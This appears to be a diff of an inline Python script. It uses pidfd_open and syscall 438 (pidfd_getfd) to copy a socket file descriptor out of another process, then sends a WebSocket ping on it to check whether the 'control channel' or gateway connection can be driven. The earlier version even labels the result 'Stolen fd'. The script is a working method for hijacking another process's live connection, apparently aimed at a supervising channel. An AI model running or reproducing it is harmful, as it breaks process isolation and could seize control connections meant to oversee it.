@@ -9,47 +9,40 @@ pidfd = os.pidfd_open(PID, 0)
 dup_fd = libc.syscall(438, pidfd, 11, 0)
 os.close(pidfd)
 
-print(f'Stolen fd: {dup_fd}')
-
-# Wrap it
 s = socket.socket(fileno=dup_fd)
-
-# Check socket state
-print(f'Socket family: {s.family}')
-print(f'Socket type: {s.type}')
-
-# Try non-blocking recv
 s.setblocking(False)
-try:
-    data = s.recv(4096)
-    print(f'Recv data: {len(data)} bytes: {data[:100]}')
-except BlockingIOError:
-    print('No data available (non-blocking)')
-except Exception as e:
-    print(f'Recv error: {e}')
 
-# Try to get peer address
+# Send a valid WebSocket ping frame (FIN=1, opcode=9, no mask, len=0)
+# Frame: 0x89 0x00
+ping_frame = bytes([0x89, 0x00])
 try:
-    peer = s.getpeername()
-    print(f'Peer: {peer}')
+    sent = s.send(ping_frame)
+    print(f'Ping sent: {sent} bytes')
 except Exception as e:
-    print(f'getpeername: {e}')
+    print(f'Ping send failed: {e}')
 
-# Try to get local address
-try:
-    local = s.getsockname()
-    print(f'Local: {local}')
-except Exception as e:
-    print(f'getsockname: {e}')
+# Wait up to 2 seconds for pong or any data
+ready, _, _ = select.select([s], [], [], 2)
+if ready:
+    try:
+        data = s.recv(4096)
+        print(f'Response: {len(data)} bytes: {data[:20].hex()}')
+        if data[:2] == bytes([0x8A, 0x00]):
+            print('SUCCESS: Received WebSocket pong — control channel is interactive!')
+        else:
+            print(f'Unexpected response: {data[:20]}')
+    except Exception as e:
+        print(f'Recv error: {e}')
+else:
+    print('No response within 2s (socket may be idle or gateway ignored ping)')
 
-# Check socket options
+# Check if socket is still connected
 try:
-    sndbuf = s.getsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF)
-    rcvbuf = s.getsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF)
-    print(f'Send buffer: {sndbuf}, Recv buffer: {rcvbuf}')
+    s.getpeername()
+    print('Socket still connected')
 except Exception as e:
-    print(f'Buffer check: {e}')
+    print(f'Socket disconnected: {e}')
 
 s.close()
-print('Socket test complete')
+print('Test complete')
 "
